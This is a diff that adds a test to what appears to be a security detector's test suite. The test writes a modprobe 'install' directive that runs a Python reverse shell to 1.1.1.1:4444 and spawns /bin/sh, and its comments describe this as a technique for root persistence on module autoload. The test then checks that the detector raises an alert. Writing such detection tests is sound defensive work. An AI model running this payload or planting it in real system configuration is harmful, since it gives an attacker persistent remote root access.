@@ -307,3 +307,16 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on modprobe install directive)" {
+    # Sister to nc / curl|bash / dev-tcp modprobe install rev-
+    # shell variants already locked. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on T1547.006
+    # module-autoload-trigger root-exec persistence surface —
+    # modprobe runs install AS ROOT on auto-load (network packets,
+    # /dev/* access, ld.so dep).
+    printf 'install evilmod /bin/sh -c "python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
